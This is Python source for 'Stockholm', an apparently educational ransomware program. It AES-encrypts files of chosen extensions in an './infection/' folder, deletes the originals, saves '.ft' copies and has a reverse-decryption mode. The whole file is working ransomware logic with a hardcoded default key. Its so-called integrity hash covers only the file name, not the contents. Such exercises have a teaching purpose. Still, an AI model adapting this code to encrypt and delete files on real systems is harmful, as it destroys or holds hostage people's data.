import os
import glob
import hashlib
from Crypto.Cipher import AES
import sys
key = b'password42424242'
silent = 0
PATH = './infection/'
EXTENSIONS = './extensions'
HASHES_FILE = './file_hashes'

def doDir(directory, flag):
    with open(EXTENSIONS, 'r') as extensionsFile:
        allowedExtensions = [extension.strip().lower() for extension in extensionsFile.readlines()]
    pattern = os.path.join(directory, '*')
    files = glob.glob(pattern)
    if flag == 0:
        deleteHashes()
    for file in files:
        if flag == 0:
            encryptFile(file, allowedExtensions)
        else:
            reverseEncrypt(file)
    if flag != 0:
        deleteHashes()
            
def deleteHashes():
    if os.path.exists(HASHES_FILE):
            os.remove(HASHES_FILE)

def encryptFile(file, EXTENSIONS):
    fileEx = os.path.splitext(file)[1]
    originalFileName = os.path.splitext(file)[0]
    if fileEx.lower() in EXTENSIONS:
        with open(file, 'rb') as fileR:
            plain = fileR.read()
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(plain)
        hash = generateHash(file)
        with open(HASHES_FILE, 'a') as hashes:
            hashes.write(originalFileName + fileEx + ':' + hash + '\n')
        encryptFilePath = file + '.ft'
        with open(encryptFilePath, 'wb') as encryptedFile:
            [encryptedFile.write(x) for x in (cipher.nonce, tag, ciphertext)]
        os.remove(file)
        if silent == 0:
            print("File", file, "encrypted")

def reverseEncrypt(file):
    try:
        with open(HASHES_FILE, 'r') as hashes:
            lines = hashes.readlines()
    except:
        print("ERROR: Hash file not found")
        exit(1)
    if not lines:
        print("No hashs found in", HASHES_FILE)
        return
    for line in lines:
        line = line.strip()
        parts = line.split(':')
        if len(parts) == 2:
            if parts[0] == file[:-3]:
                originalHash = parts[1]
                with open(file, 'rb') as encryptedFile:
                    nonce, tag, ciphertext = [encryptedFile.read(x) for x in (16, 16, -1)]    
                cipher = AES.new(key, AES.MODE_EAX, nonce)
                try:
                    plain = cipher.decrypt_and_verify(ciphertext, tag)
                    decryptedFileName = file[:-3]
                    with open(decryptedFileName, 'wb') as decryptedFile:
                        decryptedFile.write(plain)
                    decryptedHash = generateHash(decryptedFileName)
                    if originalHash == decryptedHash:
                        if silent == 0:
                            print("File", file, "decrypted successfully.")
                        os.remove(file)
                    else:
                        print("Failed to decrypt", file)
                    return
                except ValueError:
                    print("Failed to decrypt", file)
                    return
    if silent == 0:
        print("File", file, "not found in the hashes file.")

def generateHash(file):
    fileEx = os.path.basename(file)
    hash_object = hashlib.sha256(fileEx.encode())
    hexDig = hash_object.hexdigest()
    return hexDig
    
def getPassword(inputPass):
    global key
    if len(inputPass) != 16 and len(inputPass) != 24 and len(inputPass) != 32:
        print("Invalid key length")
        exit(1)
    else:
        key = inputPass.encode()

def help():
    print("Use -help or -h to show this message")
    print("Use -version or -v to show program version")
    print("Use -password or -p to set the encryption password and encrypt the files")
    print("Use -reverse or -r to revert the encryption")
    print("Use -silent or -s to avoid printing the files that are being encrypted")
    print("Without -password or -p it will use the default password")
    print("You can combine some of the flags, for example: ./stockholm -s -r or ./stockholm -s -r -p yourpass")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        for a in sys.argv[1:]:
            if a == "-help" or a == "-h":
                help()
            if a == "-version" or a == "-v":
                print("Stockholm v0 by mvillaes")
            if a == "-silent" or a == "-s":
                silent = 1
                if len(sys.argv) < 3:
                    doDir(PATH, 0)
            if a == "-reverse" or a == "-r":
                if len(sys.argv) > sys.argv.index(a) + 2:
                    if sys.argv[sys.argv.index(a) + 1] == "-p" or  sys.argv[sys.argv.index(a) + 1] == "-password":
                        getPassword(sys.argv[sys.argv.index(a) + 2])
                doDir(PATH, 1)
                exit()
            if a == "-password" or a == "-p":
                getPassword(sys.argv[sys.argv.index(a) + 1])
                doDir(PATH, 0)
    else:
        doDir(PATH, 0)